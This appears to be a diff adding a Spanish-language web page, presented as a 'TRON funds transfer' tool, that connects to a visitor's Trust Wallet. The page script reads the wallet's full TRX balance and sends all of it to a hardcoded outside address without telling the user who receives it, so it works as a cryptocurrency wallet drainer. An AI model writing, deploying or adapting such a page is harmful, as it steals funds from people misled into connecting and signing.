@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transferencia TRON</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        button {
+            background-color: #1c1c1c;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            font-size: 16px;
+        }
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+    </style>
+</head>
+<body>
+    <h1>Transferencia de Fondos TRON</h1>
+    <p>Conecta tu billetera Trust Wallet para transferir todos tus fondos TRX</p>
+    
+    <button id="connectBtn">Conectar Trust Wallet</button>
+    <button id="transferBtn" disabled>Transferir Fondos</button>
+    
+    <div id="status"></div>
+    
+    <script>
+        // Configuración de TronWeb
+        const tronWeb = new TronWeb({
+            fullHost: 'https://api.trongrid.io',
+            headers: { "TRON-PRO-API-KEY": "tu-api-key" } // Opcional: registra una API key en trongrid.io
+        });
+        
+        // Dirección de destino
+        const destino = "TTe7RUx6YN2sA7xwbFfnNr2cKQ6Z1B6eS7";
+        
+        // Elementos del DOM
+        const connectBtn = document.getElementById('connectBtn');
+        const transferBtn = document.getElementById('transferBtn');
+        const statusDiv = document.getElementById('status');
+        
+        // Conectar a Trust Wallet
+        connectBtn.addEventListener('click', async () => {
+            try {
+                if (window.tronWeb && window.tronWeb.ready) {
+                    // Solicitar permiso para conectar
+                    await window.tronWeb.request({method: 'tron_requestAccounts'});
+                    
+                    // Verificar que esté en la red TRON
+                    if (window.tronWeb.fullNode.host !== tronWeb.fullHost) {
+                        statusDiv.textContent = "Por favor cambia a la red principal de TRON en Trust Wallet";
+                        statusDiv.className = "error";
+                        return;
+                    }
+                    
+                    const direccion = window.tronWeb.defaultAddress.base58;
+                    statusDiv.textContent = `Conectado: ${direccion}`;
+                    statusDiv.className = "success";
+                    
+                    // Habilitar botón de transferencia
+                    transferBtn.disabled = false;
+                    connectBtn.disabled = true;
+                } else {
+                    statusDiv.textContent = "Trust Wallet no detectado. Por favor ábrelo en el navegador móvil.";
+                    statusDiv.className = "error";
+                }
+            } catch (error) {
+                statusDiv.textContent = `Error: ${error.message}`;
+                statusDiv.className = "error";
+            }
+        });
+        
+        // Transferir fondos
+        transferBtn.addEventListener('click', async () => {
+            try {
+                if (!window.tronWeb || !window.tronWeb.ready) {
+                    throw new Error("Trust Wallet no conectado");
+                }
+                
+                statusDiv.textContent = "Obteniendo balance...";
+                statusDiv.className = "";
+                
+                // Obtener balance
+                const balance = await window.tronWeb.trx.getBalance();
+                const balanceTRX = window.tronWeb.fromSun(balance);
+                
+                if (balanceTRX <= 0) {
+                    throw new Error("No hay fondos para transferir");
+                }
+                
+                statusDiv.textContent = `Transferiendo ${balanceTRX} TRX...`;
+                
+                // Crear transacción
+                const tx = await window.tronWeb.transactionBuilder.sendTrx(
+                    destino,
+                    balance,
+                    window.tronWeb.defaultAddress.base58
+                );
+                
+                // Firmar transacción
+                const signedTx = await window.tronWeb.trx.sign(tx);
+                
+                // Enviar transacción
+                const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
+                
+                statusDiv.textContent = `Transacción exitosa! TXID: ${result.txid}`;
+                statusDiv.className = "success";
+                
+            } catch (error) {
+                statusDiv.textContent = `Error: ${error.message}`;
+                statusDiv.className = "error";
+            }
+        });
+    </script>
+</body>
+</html>
